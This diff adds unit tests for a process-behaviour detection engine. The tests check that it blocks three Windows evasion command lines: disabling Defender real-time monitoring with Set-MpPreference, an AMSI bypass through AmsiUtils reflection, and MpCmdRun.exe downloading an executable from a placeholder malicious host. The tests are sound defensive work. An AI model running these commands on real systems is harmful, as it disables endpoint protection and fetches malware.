@@ -539,4 +539,46 @@ describe('BehaviorEngineService (Phase F — Process Lineage + LOLBin Monitoring
       expect(res.reason).toContain('expired');
     });
   });
+
+  describe('9. Windows Defender Symbiosis & Evasion Prevention Rules', () => {
+    it('detects and flags attempts to disable Windows Defender or tamper with exclusions', () => {
+      const result = engine.evaluateProcess({
+        pid: 9101,
+        processName: 'powershell.exe',
+        commandLine: 'powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true'
+      });
+
+      expect(result.riskScore).toBeGreaterThanOrEqual(85);
+      expect(result.evidence.some(e => e.ruleId === 'behav-defender-tamper-disable')).toBe(true);
+      expect(result.threatName).toBe('DEFENDER_TAMPER_DISABLE_ATTEMPT');
+      expect(result.verdict).toBe('BLOCK');
+      expect(result.engineVerdict).toBe('CONTAIN_PROCESS');
+    });
+
+    it('detects and flags in-memory AMSI bypass/tamper attempts', () => {
+      const result = engine.evaluateProcess({
+        pid: 9102,
+        processName: 'powershell.exe',
+        commandLine: 'powershell.exe [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\')'
+      });
+
+      expect(result.riskScore).toBeGreaterThanOrEqual(85);
+      expect(result.evidence.some(e => e.ruleId === 'behav-amsi-bypass-tamper')).toBe(true);
+      expect(result.threatName).toBe('AMSI_TAMPER_BYPASS_ATTEMPT');
+      expect(result.verdict).toBe('BLOCK');
+    });
+
+    it('detects and flags MpCmdRun.exe download abuse', () => {
+      const result = engine.evaluateProcess({
+        pid: 9103,
+        processName: 'mpcmdrun.exe',
+        commandLine: 'MpCmdRun.exe -DownloadFile -url http://malicious.cc/drop.exe'
+      });
+
+      expect(result.riskScore).toBeGreaterThanOrEqual(75);
+      expect(result.evidence.some(e => e.ruleId === 'behav-mpcmdrun-download-abuse')).toBe(true);
+      expect(result.verdict).toBe('BLOCK');
+    });
+  });
 });
+
